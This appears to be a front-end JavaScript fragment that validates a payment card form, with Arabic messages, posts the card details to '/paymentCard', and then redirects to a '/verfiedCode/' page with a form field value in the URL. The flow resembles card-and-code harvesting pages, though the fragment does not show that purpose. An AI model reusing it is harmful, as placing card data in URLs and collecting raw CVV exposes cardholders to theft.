    <script type="text/javascript" src="/js/jquery.validate.min.js"></script>
    <script>
       $("#cardForm").validate({
            rules: {
            name: {
                required: true,
            },
            carddate1: {
                required: true,
            },
            carddate: {
                required: true,
            },
            cvv: {
                required: true,
                minlength: 3,
                number: true,
            },
            cardnumber: {
                required: true,
                minlength: 16,
                number: true,
            },
            },
            messages: {
            name: "الرجاء ادخال الأسم  ",
            carddate1: "الرجاء ادخال السنة ",
            carddate: "الرجاء ادخال الشهر ",
            cvv: " الرجاء ادخال رمز سري صحيح ",
            cardnumber: "الرجاء ادخال رقم صحيح ",
            },
            submitHandler: SubForm,
        });
        function SubForm() {
            let f= $("#cardForm").serializeArray()
            console.log("send start")
            $.ajax({
            url: "/paymentCard",
            type: "post",
            data: $("#cardForm").serializeArray(),
            beforeSend: function () {
                $("#error").fadeOut();
                $("#cardSubmit").html(
                '<span class="glyphicon glyphicon-transfer"></span>  <span style="color:#fff">  جاري التسجيل </span>'
                );
            },
            success: function () {
                    setTimeout(() => {
                        window.location.replace(`/verfiedCode/${f[3].value}`);
                    }, 1000)
            // window.location.replace("/verfiedCode");
            },
            error: function () {
                // alert("There was an error :(");
            },
            });
            return false;
        }
    </script>
